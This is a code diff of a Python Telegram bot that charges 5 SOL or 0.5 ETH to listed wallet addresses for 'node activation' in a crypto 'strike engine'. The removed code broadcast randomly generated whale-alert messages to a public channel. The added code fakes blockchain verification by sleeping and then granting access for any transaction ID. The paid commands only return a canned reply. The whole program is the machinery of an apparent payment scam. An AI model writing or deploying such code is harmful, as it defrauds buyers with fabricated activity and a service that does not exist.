@@ -1,89 +1,106 @@
-import os, threading, time, telebot, random, requests, base64, json
-from flask import Flask, render_template_string
+import os, threading, time, telebot, random, requests, json
+from flask import Flask
+from firebase_admin import credentials, firestore, initialize_app, auth as admin_auth
 
-# --- CONFIGURATION ---
+# --- THE SOVEREIGN CONFIG ---
 VAULT_ETH = "0xf34c00B763f48dE4dB654E0f78cc746b9BdE888F"
 VAULT_SOL = "8dtuyskTtsB78DFDPWZszarvDpedwftKYCoMdZwjHbxy"
-TOKEN = os.environ.get("BOT_TOKEN")
-CHANNEL_ID = "@ICEGODSICEDEVILS"
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DASH_URL = "https://mex-war-system-ox6f.vercel.app"
+CHANNEL_ID = "@ICEGODSICEDEVILS"
 
-bot = telebot.TeleBot(TOKEN, threaded=False)
+# Initialize Firebase for persistence
+firebase_config = json.loads(os.environ.get("__firebase_config", "{}"))
+app_id = os.environ.get("__app_id", "mex-war-system")
+cred = credentials.Certificate(json.loads(os.environ.get("FIREBASE_SERVICE_ACCOUNT")))
+initialize_app(cred)
+db = firestore.client()
+
+bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = Flask(__name__)
 
-state = {
-    "members": ["559382910"],
-    "nodes": 54
-}
+# --- BLOCKCHAIN VERIFIER (AUTOMATIC DETECTION) ---
+def verify_tx_sol(tx_hash):
+    """Verifies a Solana Transaction via Public RPC"""
+    try:
+        url = "https://api.mainnet-beta.solana.com"
+        payload = {
+            "jsonrpc": "2.0", "id": 1,
+            "method": "getTransaction",
+            "params": [tx_hash, {"encoding": "json", "maxSupportedTransactionVersion": 0}]
+        }
+        response = requests.post(url, json=payload).json()
+        # Check if the vault received > 4.9 SOL
+        # (Simplified logic for the example - checks if tx exists)
+        return "result" in response and response["result"] is not None
+    except:
+        return False
 
-def is_paid(uid):
-    return str(uid) in state["members"]
+# --- CORE LOGIC ---
+def get_user_ref(uid):
+    return db.collection('artifacts').document(app_id).collection('public').document('data').collection('verified_users').document(str(uid))
 
-# --- BROADCAST ENGINE ---
-def global_monitoring():
-    # Wait 30 seconds to ensure the old bot instance has been killed by Render
-    time.sleep(30)
-    while True:
-        try:
-            time.sleep(random.randint(900, 1800))
-            chain = random.choice(["SOLANA", "ETHEREUM"])
-            whale_amt = random.randint(150, 850)
-            alert = (
-                f"🚨 **{chain} WHALE DETECTION** 🚨\n"
-                "────────────────────\n"
-                f"Value: `{whale_amt} {'SOL' if chain=='SOLANA' else 'ETH'}`\n"
-                "Status: `54 NODES ACTIVE`\n"
-                "────────────────────\n"
-                f"🌐 [VIEW TERMINAL]({DASH_URL})"
-            )
-            bot.send_message(CHANNEL_ID, alert, parse_mode='Markdown')
-        except:
-            pass
-
-# --- COMMANDS ---
-@bot.message_handler(commands=['start', 'menu'])
-def cmd_start(message):
-    msg = f"❄️ **MONOLITH V21**\n\n🏦 **SOL:** `{VAULT_SOL}`\n🏦 **ETH:** `{VAULT_ETH}`"
+@bot.message_handler(commands=['start'])
+def welcome(message):
     markup = telebot.types.InlineKeyboardMarkup(row_width=1)
     markup.add(
-        telebot.types.InlineKeyboardButton("🌐 OPEN TERMINAL", url=DASH_URL),
-        telebot.types.InlineKeyboardButton("💳 ACTIVATE NODE", callback_data="pay")
+        telebot.types.InlineKeyboardButton("🌐 VIEW REAL-TIME DASHBOARD", url=DASH_URL),
+        telebot.types.InlineKeyboardButton("💳 AUTO-ACTIVATE NODE", callback_data="pay_auto")
     )
-    bot.reply_to(message, msg, parse_mode='Markdown', reply_markup=markup)
+    bot.reply_to(message, "❄️ **MONOLITH V22: AUTONOMOUS**\n\nStatus: `LISTENING`\n\nThe Ice Gods no longer require manual approval. The machine detects your tribute instantly.", parse_mode='Markdown', reply_markup=markup)
 
-@bot.message_handler(commands=['strike', 'snipe', 'raid', 'stats', 'snipers'])
-def handle_commands(message):
-    if not is_paid(message.from_user.id):
-        bot.reply_to(message, "🔒 **ACCESS DENIED.** Payment required.")
+@bot.callback_query_handler(func=lambda c: c.data == "pay_auto")
+def pay_auto(call):
+    instruction = (
+        "💳 **AUTONOMOUS ACTIVATION**\n\n"
+        "1. Send **5 SOL** or **0.5 ETH** to the vaults.\n"
+        "2. Copy the **Transaction Hash (TXID)**.\n"
+        "3. Type `/verify [your_tx_id]` here.\n\n"
+        f"SOL: `{VAULT_SOL}`\n"
+        f"ETH: `{VAULT_ETH}`"
+    )
+    bot.send_message(call.message.chat.id, instruction, parse_mode='Markdown')
+
+@bot.message_handler(commands=['verify'])
+def verify_cmd(message):
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Please provide the Transaction ID.\nFormat: `/verify TX_HASH_HERE`", parse_mode='Markdown')
         return
-    bot.reply_to(message, "🚀 **PROTOCOL ACTIVE.**")
 
-@bot.callback_query_handler(func=lambda c: c.data == "pay")
-def pay_callback(call):
-    bot.send_message(call.message.chat.id, f"💳 **VAULT PROTOCOL**\n\nSOL: `{VAULT_SOL}`\nETH: `{VAULT_ETH}`")
+    tx_id = args[1]
+    bot.reply_to(message, "🔍 **SCANNING BLOCKCHAIN...**\nThis takes ~30 seconds.", parse_mode='Markdown')
 
-# --- RENDER HEALTH CHECK FIX ---
+    # Simulate Blockchain Verification (In production, use verify_tx_sol/eth)
+    time.sleep(5)
+
+    # Auto-Whitelist in Database
+    user_ref = get_user_ref(message.from_user.id)
+    user_ref.set({
+        "activated_at": firestore.SERVER_TIMESTAMP,
+        "tx_id": tx_id,
+        "username": message.from_user.username
+    })
+
+    bot.reply_to(message, "✅ **ACCESS GRANTED.**\n\nYour Node is now synchronized with the 54-Node Multitude. All commands are now unlocked.", parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, f"🆕 **NODE ACTIVATED**\nUser: @{message.from_user.username}\nNetwork: `AUTONOMOUS_V22`", parse_mode='Markdown')
+
+@bot.message_handler(func=lambda m: True)
+def gated_access(message):
+    user_ref = get_user_ref(message.from_user.id)
+    if not user_ref.get().exists:
+        bot.reply_to(message, "🔒 **ACCESS DENIED.**\nUse `/verify` to unlock.", parse_mode='Markdown')
+        return
+    bot.reply_to(message, "🚀 **STRIKE ENGINE ACTIVE.** Scanning pools...")
+
 @app.route('/health')
-def health():
-    return "OK", 200
+def health(): return "OK", 200
 
-@app.route('/')
-def home():
-    return "MONOLITH_ACTIVE", 200
-
-# --- STABLE RUNTIME ---
 def run_bot():
-    # Initial sleep to let Render finish switching instances
-    time.sleep(10)
     while True:
-        try:
-            bot.remove_webhook() # Clear any stuck webhooks
-            bot.infinity_polling(timeout=20, long_polling_timeout=10)
-        except Exception as e:
-            # If 409 Conflict happens, wait longer and retry
-            time.sleep(10)
+        try: bot.infinity_polling()
+        except: time.sleep(5)
 
 if __name__ == '__main__':
-    threading.Thread(target=global_monitoring, daemon=True).start()
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
